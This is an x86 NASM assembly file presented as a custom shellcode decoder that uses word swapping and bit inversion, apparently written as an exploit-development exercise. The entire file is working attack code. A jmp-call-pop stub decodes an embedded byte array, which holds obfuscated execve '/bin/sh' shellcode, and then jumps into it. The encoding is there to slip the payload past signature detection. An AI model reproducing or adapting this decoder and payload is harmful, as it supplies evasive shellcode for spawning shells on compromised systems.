; Filename: word-swap-and-invert-decoder.nasm
; Author:  Juanma Reyes
; Website:  jmreyes.net
;
; Purpose: Custom shellcode decoder (word swap and invert)

global _start                   

section .text
_start:
        jmp short call_shellcode

decoder:
        pop esi
        xor ecx, ecx
        mov cl, [esi]
	inc esi

decode:
	mov eax, [esi+4]
	mov ebx, [esi]
	not eax
	not ebx
	mov [esi], eax
	mov [esi+4], ebx
      
	add esi, 8 
	sub ecx, 8
	jnz decode

        jmp short EncodedShellcode

call_shellcode:
        call decoder
	Size: db 32
        EncodedShellcode: db 0xd0,0xd0,0x8c,0x97,0xce,0x3f,0xaf,0x97,0x91,0x76,0x1c,0xaf,0x97,0xd0,0x9d,0x96,0x1e,0x4f,0xf4,0x32,0x76,0x1d,0xac,0x76,0x6f,0x6f,0x6f,0x6f,0x7f,0x6f,0x6f,0x6f

